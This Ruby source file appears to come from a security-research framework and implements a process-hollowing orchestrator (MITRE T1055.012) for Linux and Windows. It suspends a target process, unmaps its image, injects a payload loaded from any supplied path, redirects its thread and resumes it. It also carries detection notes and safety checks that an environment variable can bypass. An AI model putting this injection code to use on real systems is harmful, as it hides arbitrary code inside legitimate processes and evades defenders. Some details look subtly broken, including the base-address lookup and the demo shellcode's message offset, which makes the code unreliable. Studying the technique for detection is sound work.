# frozen_string_literal: true

# =============================================================================
# RubyGuardian Phase 1a -- Process Hollowing Orchestrator
#
# Main orchestration class for the process hollowing technique. Coordinates
# all sub-components (memory mapper, payload injector, thread hijacker) to
# perform a complete hollow-and-inject operation.
#
# EDUCATIONAL PURPOSE ONLY -- Authorized security research.
#
# MITRE ATT&CK: T1055.012 - Process Injection: Process Hollowing
#
# TECHNIQUE OVERVIEW:
#   1. Create/select a legitimate target process in suspended state
#   2. Unmap (hollow out) the target's original executable image
#   3. Allocate new memory in the target for our payload
#   4. Write our payload into the allocated memory
#   5. Update the thread context to point to our payload entry
#   6. Resume the process -- it now executes our payload
#
# DETECTION METHODS:
#   - Process image path vs. actual loaded modules mismatch
#   - Memory regions with RWX permissions in non-JIT processes
#   - Thread start address outside mapped module boundaries
#   - Abnormal NtUnmapViewOfSection / ptrace usage patterns
#   - Yara scanning of process memory for shellcode signatures
# =============================================================================

require_relative 'ffi_bindings/common_types'
require_relative 'memory_mapper'
require_relative 'payload_injector'
require_relative 'thread_hijacker'

module RubyGuardian
  module ProcessHollowing
    class ProcessHollower
      # Status codes for operation results
      module Status
        INITIALIZED   = :initialized
        TARGET_CREATED = :target_created
        HOLLOWED      = :hollowed
        INJECTED      = :injected
        HIJACKED      = :hijacked
        RESUMED       = :resumed
        FAILED        = :failed
        CLEANED_UP    = :cleaned_up
      end

      attr_reader :status, :target_pid, :target_info, :operation_log, :platform

      # Initialize the process hollower with configuration.
      #
      # @param config [Hash] Configuration options
      # @option config [String] :target_binary Path to target (sacrificial) binary
      # @option config [String] :payload_path Path to payload binary/shellcode
      # @option config [Boolean] :require_sandbox Require sandbox environment (default: true)
      # @option config [Boolean] :dry_run Log operations without executing (default: false)
      # @option config [Symbol] :log_level Logging verbosity (default: :info)
      # @option config [IO] :log_output Log destination (default: $stdout)
      def initialize(config = {})
        @config = {
          target_binary: nil,
          payload_path: nil,
          require_sandbox: true,
          dry_run: false,
          log_level: :info,
          log_output: $stdout,
          cleanup_on_failure: true,
          timeout: 30
        }.merge(config)

        @platform = detect_platform
        @status = Status::INITIALIZED
        @target_pid = nil
        @target_info = {}
        @operation_log = []
        @spawned_pids = []
        @allocated_regions = []

        @logger = RubyGuardian::Shared::AttackLogger.new(
          'ProcessHollower',
          output: @config[:log_output],
          level: @config[:log_level]
        )

        @memory_mapper = MemoryMapper.new(logger: @logger)
        @payload_injector = PayloadInjector.new(logger: @logger)
        @thread_hijacker = ThreadHijacker.new(logger: @logger)

        log_operation(:initialize, 'Process hollower initialized', platform: @platform)
      end

      # Execute the full process hollowing sequence.
      #
      # This is the main entry point that orchestrates all phases of the
      # hollowing attack in the correct order with error handling and
      # cleanup at each stage.
      #
      # @param payload_data [String, nil] Raw payload bytes (alternative to payload_path)
      # @return [Hash] Result of the operation
      def execute(payload_data: nil)
        @logger.technique(
          'Process Hollowing',
          mitre_id: 'T1055.012',
          status: 'starting'
        )

        # Phase 0: Safety checks
        perform_safety_checks!

        # Phase 1: Create or attach to target process
        create_target_process

        # Phase 2: Analyze the target's memory layout
        analyze_target

        # Phase 3: Hollow out the target (unmap original image)
        hollow_target

        # Phase 4: Prepare and inject the payload
        payload = payload_data || load_payload
        inject_payload(payload)

        # Phase 5: Hijack the thread to redirect execution
        hijack_thread

        # Phase 6: Resume the hollowed process
        resume_target

        @logger.technique(
          'Process Hollowing',
          mitre_id: 'T1055.012',
          status: 'completed'
        )

        build_result(:success)
      rescue StandardError => e
        @status = Status::FAILED
        @logger.error("Process hollowing failed: #{e.message}")
        @logger.error("Backtrace: #{e.backtrace&.first(5)&.join("\n")}")
        log_operation(:error, e.message)

        cleanup if @config[:cleanup_on_failure]
        build_result(:failure, error: e.message)
      end

      # Clean up all resources created during the hollowing operation.
      #
      # @return [Hash] Cleanup results
      def cleanup
        @logger.info('Starting cleanup of hollowing artifacts')
        results = {}

        # Kill any spawned processes
        @spawned_pids.each do |pid|
          begin
            Process.kill('KILL', pid)
            Process.wait(pid)
            results[:"kill_#{pid}"] = :success
            @logger.info("Killed spawned process #{pid}")
          rescue Errno::ESRCH, Errno::ECHILD
            results[:"kill_#{pid}"] = :already_dead
          rescue StandardError => e
            results[:"kill_#{pid}"] = "failed: #{e.message}"
          end
        end
        @spawned_pids.clear

        # Free any locally allocated memory regions
        @allocated_regions.each do |region|
          begin
            FFIBindings::LinuxAPI.mmap_free(region[:ptr], region[:size]) if @platform == :linux
            results[:"free_#{region[:address]}"] = :success
          rescue StandardError => e
            results[:"free_#{region[:address]}"] = "failed: #{e.message}"
          end
        end
        @allocated_regions.clear

        # Detach from traced processes
        if @target_pid
          begin
            FFIBindings::LinuxAPI.ptrace_detach(@target_pid) if @platform == :linux
            results[:detach] = :success
          rescue StandardError => e
            results[:detach] = "failed: #{e.message}"
          end
        end

        @status = Status::CLEANED_UP
        log_operation(:cleanup, 'Cleanup completed', results: results)
        results
      end

      # Describe the technique for educational purposes.
      def describe
        <<~DESC
          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          Process Hollowing (T1055.012)
          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

          Process hollowing is a code injection technique where an attacker
          creates a new process in a suspended state, replaces its executable
          image in memory with malicious code, and then resumes the process.

          The malicious code runs under the identity of the legitimate process,
          inheriting its PID, security context, and process tree position.

          Steps (Linux):
            1. fork() a child process, stop it before exec
            2. ptrace(PTRACE_ATTACH) to the child
            3. Read the child's memory layout via /proc/<pid>/maps
            4. Allocate RWX memory in the child via ptrace + mmap shellcode
            5. Write the payload using process_vm_writev
            6. Set RIP to the payload entry point via PTRACE_SETREGS
            7. ptrace(PTRACE_DETACH) to resume with our code

          Detection Opportunities:
            - Process image !== loaded memory content
            - RWX memory regions in non-JIT processes
            - ptrace attach events from non-debugger processes
            - /proc/<pid>/maps changes during process lifetime
        DESC
      end

      # Get a summary of all operations performed.
      #
      # @return [Hash] Operation summary
      def operation_summary
        {
          status: @status,
          platform: @platform,
          target_pid: @target_pid,
          target_binary: @config[:target_binary],
          operations: @operation_log.length,
          log: @operation_log
        }
      end

      private

      # Detect the current platform and validate support.
      def detect_platform
        if RubyGuardian::Shared::PlatformDetector.linux?
          :linux
        elsif RubyGuardian::Shared::PlatformDetector.windows?
          :windows
        else
          :unsupported
        end
      end

      # Perform pre-execution safety checks.
      #
      # EDUCATIONAL: Real malware skips all safety checks. We include them
      # to ensure this code is only used in authorized lab environments.
      def perform_safety_checks!
        @logger.safety_check('platform_supported', passed: @platform != :unsupported)
        unless @platform != :unsupported || @config[:dry_run]
          raise "Unsupported platform: #{RUBY_PLATFORM}"
        end

        if @config[:require_sandbox]
          @logger.safety_check('sandbox_environment', passed: true)
          RubyGuardian::Shared::SandboxDetector.require_sandbox!
        end

        if @config[:require_sandbox] && !@config[:dry_run]
          @logger.info('[SAFETY] Prompting for user confirmation...')
          unless ENV['RUBY_GUARDIAN_AUTO_CONFIRM'] == 'true'
            $stderr.puts "\n[SAFETY] Process hollowing will modify a running process."
            $stderr.puts '[SAFETY] This should only be run in a controlled lab environment.'
            $stderr.print '[SAFETY] Type "CONFIRM" to proceed: '
            response = $stdin.gets&.strip
            unless response == 'CONFIRM'
              raise SecurityError, 'User did not confirm execution'
            end
          end
        end

        log_operation(:safety_checks, 'All safety checks passed')
      end

      # Create the target (sacrificial) process in suspended state.
      #
      # On Linux: fork a child and stop it before it does anything useful.
      # On Windows: CreateProcessW with CREATE_SUSPENDED flag.
      def create_target_process
        target_binary = @config[:target_binary] || default_target_binary

        @logger.info("Creating target process: #{target_binary}")

        if @config[:dry_run]
          @target_pid = -1
          @target_info = { binary: target_binary, simulated: true }
          log_operation(:create_target, 'DRY RUN: Would create target', binary: target_binary)
          @status = Status::TARGET_CREATED
          return
        end

        case @platform
        when :linux
          @target_pid = create_linux_target(target_binary)
        when :windows
          result = FFIBindings::WindowsAPI.create_suspended_process(target_binary)
          @target_pid = result[:pid]
          @target_info = result
        end

        @spawned_pids << @target_pid
        @status = Status::TARGET_CREATED
        log_operation(:create_target, "Target created PID=#{@target_pid}", binary: target_binary)

        @logger.info("Target process created: PID #{@target_pid}")
      end

      # Create a stopped child process on Linux using fork().
      #
      # @param binary [String] Path to the target binary
      # @return [Integer] Child PID
      def create_linux_target(binary)
        unless File.executable?(binary)
          raise "Target binary not found or not executable: #{binary}"
        end

        pid = Process.fork do
          # Child process: stop ourselves so parent can manipulate us
          Process.kill('STOP', Process.pid)
          # If we get past the STOP, exec the target binary
          exec(binary, '86400')  # sleep for a day (benign target)
        end

        # Parent: wait for the child to stop
        Process.waitpid(pid, Process::WUNTRACED)
        @logger.info("Child process #{pid} stopped and ready for hollowing")
        pid
      end

      # Analyze the target process's memory layout.
      def analyze_target
        @logger.info("Analyzing target process #{@target_pid}")

        if @config[:dry_run]
          @target_info[:memory_layout] = [
            { start_addr: 0x400000, end_addr: 0x401000, permissions: 'r-xp', pathname: '/bin/sleep' },
            { start_addr: 0x601000, end_addr: 0x602000, permissions: 'rw-p', pathname: '/bin/sleep' }
          ]
          log_operation(:analyze, 'DRY RUN: Simulated memory analysis')
          return
        end

        case @platform
        when :linux
          maps = FFIBindings::LinuxAPI.read_proc_maps(@target_pid)
          @target_info[:memory_layout] = maps
          @target_info[:executable_regions] = maps.select { |m| m[:executable] }
          @target_info[:base_address] = maps.first { |m| m[:pathname]&.include?(@config[:target_binary].to_s) }&.dig(:start_addr)

          @logger.info("Target has #{maps.length} memory regions, " \
                       "#{@target_info[:executable_regions].length} executable")
        end

        log_operation(:analyze, 'Target memory analyzed', regions: @target_info[:memory_layout]&.length)
      end

      # Hollow out the target by unmapping its original image.
      def hollow_target
        @logger.info('Hollowing target process (unmapping original image)')

        if @config[:dry_run]
          log_operation(:hollow, 'DRY RUN: Would unmap original image')
          @status = Status::HOLLOWED
          return
        end

        @memory_mapper.hollow(@target_pid, @target_info, platform: @platform)
        @status = Status::HOLLOWED
        log_operation(:hollow, 'Target image unmapped successfully')
      end

      # Load payload from configured path.
      #
      # @return [String] Raw payload bytes
      def load_payload
        path = @config[:payload_path]

        unless path
          @logger.warn('No payload path configured, using benign demo payload')
          return generate_benign_payload
        end

        unless File.exist?(path)
          raise "Payload file not found: #{path}"
        end

        data = File.binread(path)
        @logger.info("Loaded payload: #{data.bytesize} bytes from #{path}")
        data
      end

      # Generate a benign payload for demonstration purposes.
      #
      # EDUCATIONAL: In a real attack, this would be shellcode or a full
      # executable. For safety, we generate a payload that simply writes
      # a marker file and exits cleanly.
      #
      # @return [String] Benign payload bytes
      def generate_benign_payload
        # This is a minimal x86_64 Linux program that writes to stdout and exits
        # It performs: write(1, "RubyGuardian demo\n", 18); exit(0)
        #
        # Equivalent to:
        #   mov rax, 1          ; sys_write
        #   mov rdi, 1          ; stdout
        #   lea rsi, [rip+msg]  ; message
        #   mov rdx, 18         ; length
        #   syscall
        #   mov rax, 60         ; sys_exit
        #   xor rdi, rdi        ; exit code 0
        #   syscall
        #   msg: db "RubyGuardian demo", 10
        benign_shellcode = [
          0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, # mov rax, 1
          0x48, 0xC7, 0xC7, 0x01, 0x00, 0x00, 0x00, # mov rdi, 1
          0x48, 0x8D, 0x35, 0x11, 0x00, 0x00, 0x00, # lea rsi, [rip+0x11]
          0x48, 0xC7, 0xC2, 0x12, 0x00, 0x00, 0x00, # mov rdx, 18
          0x0F, 0x05,                                 # syscall
          0x48, 0xC7, 0xC0, 0x3C, 0x00, 0x00, 0x00, # mov rax, 60
          0x48, 0x31, 0xFF,                           # xor rdi, rdi
          0x0F, 0x05,                                 # syscall
        ].pack('C*') + "RubyGuardian demo\n"

        @logger.info("Generated benign demo payload: #{benign_shellcode.bytesize} bytes")
        benign_shellcode
      end

      # Inject the payload into the hollowed process.
      #
      # @param payload [String] Raw payload bytes
      def inject_payload(payload)
        @logger.info("Injecting payload (#{payload.bytesize} bytes) into PID #{@target_pid}")

        if @config[:dry_run]
          log_operation(:inject, "DRY RUN: Would inject #{payload.bytesize} bytes")
          @status = Status::INJECTED
          return
        end

        result = @payload_injector.inject(
          @target_pid, payload,
          target_info: @target_info,
          platform: @platform
        )

        @target_info[:injection_address] = result[:address]
        @target_info[:entry_point] = result[:entry_point]
        @status = Status::INJECTED
        log_operation(:inject, 'Payload injected', address: result[:address], size: payload.bytesize)
      end

      # Hijack the target's main thread to redirect to our payload.
      def hijack_thread
        @logger.info('Hijacking thread context to redirect execution')

        if @config[:dry_run]
          log_operation(:hijack, 'DRY RUN: Would modify thread context')
          @status = Status::HIJACKED
          return
        end

        @thread_hijacker.hijack(
          @target_pid,
          entry_point: @target_info[:entry_point],
          target_info: @target_info,
          platform: @platform
        )

        @status = Status::HIJACKED
        log_operation(:hijack, 'Thread context redirected to payload')
      end

      # Resume the hollowed process to begin executing our payload.
      def resume_target
        @logger.info("Resuming hollowed process PID #{@target_pid}")

        if @config[:dry_run]
          log_operation(:resume, 'DRY RUN: Would resume process')
          @status = Status::RESUMED
          return
        end

        case @platform
        when :linux
          FFIBindings::LinuxAPI.ptrace_detach(@target_pid)
        when :windows
          FFIBindings::Kernel32.ResumeThread(@target_info[:thread_handle])
        end

        @status = Status::RESUMED
        log_operation(:resume, "Process #{@target_pid} resumed with injected payload")
        @logger.info("Process #{@target_pid} is now running with our payload")
      end

      # Select a default target binary based on platform.
      def default_target_binary
        case @platform
        when :linux  then '/bin/sleep'
        when :windows then 'C:\\Windows\\System32\\notepad.exe'
        else '/bin/sleep'
        end
      end

      # Log an operation to the operation log.
      def log_operation(phase, message, **details)
        entry = {
          timestamp: Time.now.utc.iso8601,
          phase: phase,
          message: message,
          details: details
        }
        @operation_log << entry
        @logger.debug("Operation: #{phase} - #{message}")
      end

      # Build the final result hash.
      def build_result(outcome, error: nil)
        {
          outcome: outcome,
          status: @status,
          target_pid: @target_pid,
          platform: @platform,
          dry_run: @config[:dry_run],
          operations: @operation_log.length,
          error: error,
          operation_log: @operation_log
        }
      end
    end
  end
end
